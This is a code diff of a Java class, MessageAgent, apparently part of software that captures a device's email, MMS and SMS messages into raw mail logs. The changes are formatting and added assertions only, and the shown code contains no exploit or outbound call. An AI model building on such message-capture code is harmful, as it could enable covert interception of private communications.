@@ -83,7 +83,8 @@ public final class MessageAgent extends Agent {
      *            the agent status
      */
     public MessageAgent(final boolean agentStatus) {
-        super(AGENT_MESSAGE, agentStatus, Conf.AGENT_MESSAGE_ON_SD, "MessageAgent");
+        super(AGENT_MESSAGE, agentStatus, Conf.AGENT_MESSAGE_ON_SD,
+                "MessageAgent");
 
         //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
@@ -148,11 +149,14 @@ public final class MessageAgent extends Agent {
      *            the additional data
      * @param content
      *            the content
-     * @param logType 
+     * @param logType
      */
-    public void createLog(final byte[] additionalData, final byte[] content, int logType) {
-        //#ifdef DEBUG_TRACE
-        debug.trace("createLog");
+    public void createLog(final byte[] additionalData, final byte[] content,
+            final int logType) {
+
+        //#ifdef DBC
+        Check.requires(content != null, "createLog content null");
+        Check.requires(log!=null, "log null");
         //#endif
 
         synchronized (log) {
@@ -163,7 +167,6 @@ public final class MessageAgent extends Agent {
 
         //#ifdef DEBUG_TRACE
         debug.trace("log created");
-
         //#endif
     }
 
@@ -236,26 +239,27 @@ public final class MessageAgent extends Agent {
                         switch (filter.classtype) {
                         case Filter.CLASS_EMAIL:
                             //#ifdef DEBUG_INFO
-                            debug.info(filter.toString() );
+                            debug.info(filter.toString());
                             //#endif
                             filtersEMAIL.put(filter.type, filter);
                             break;
                         case Filter.CLASS_MMS:
                             //#ifdef DEBUG_INFO
-                            debug.info(filter.toString() );
+                            debug.info(filter.toString());
                             //#endif
                             filtersMMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_SMS:
                             //#ifdef DEBUG_INFO                            
-                            debug.info(filter.toString() );
+                            debug.info(filter.toString());
                             //#endif
                             filtersSMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_UNKNOWN: // fall through
                         default:
                             //#ifdef DEBUG
-                            debug.error("unknown classtype: "+ filter.classtype);
+                            debug.error("unknown classtype: "
+                                    + filter.classtype);
                             //#endif
                             break;
                         }
